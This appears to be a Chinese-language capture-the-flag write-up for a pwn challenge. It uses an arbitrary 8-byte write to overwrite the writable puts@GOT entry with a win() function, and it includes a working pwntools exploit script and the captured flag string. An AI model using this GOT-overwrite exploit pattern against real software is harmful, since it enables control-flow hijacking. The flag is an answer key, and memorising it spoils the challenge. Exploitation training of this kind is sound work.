# where_got_shell

## 题目简述

程序允许用户输入一个地址和一个 64 位数，然后直接执行：

```c
*(unsigned long *)address = value;
```

二进制无 PIE、仅 Partial RELRO，GOT 仍可写；程序中还存在 `win()`，其功能是执行 `system("cat flag.txt")`。这已经构成一次任意地址写，目标是覆盖后续必然调用的 GOT 表项。

## 解题过程

题目构建中 `puts@GOT` 位于 `0x404000`，`win` 位于 `0x401176`。写操作完成后程序还会调用一次：

```c
puts("Okay, exiting now...\n");
```

因此把 `puts@GOT` 改成 `win`，这次调用就会跳到 Flag 函数：

```python
from pwn import *

p = remote("HOST", PORT)
p.sendlineafter(b"value: ", b"0x404000")
p.sendlineafter(b"0x404000: ", b"0x401176")
p.interactive()
```

也可以从 ELF 动态解析地址，避免硬编码：

```python
elf = ELF("./got_shell", checksec=False)
puts_got = elf.got["puts"]
win = elf.symbols["win"]
```

最终输出：

```text
greyhats{G0t_C4nc3r_y3T?_ad8123fa}
```

## 方法总结

- 核心技巧：使用现成的任意 8 字节写原语覆盖可写 GOT 表项，把后续函数调用重定向到 `win`。
- 识别信号：Partial RELRO、无 PIE、程序接收任意地址和值并直接解引用写入。
- 复用要点：选择覆盖后一定会再次调用的函数；地址应从目标 ELF 解析，硬编码只用于对应构建。
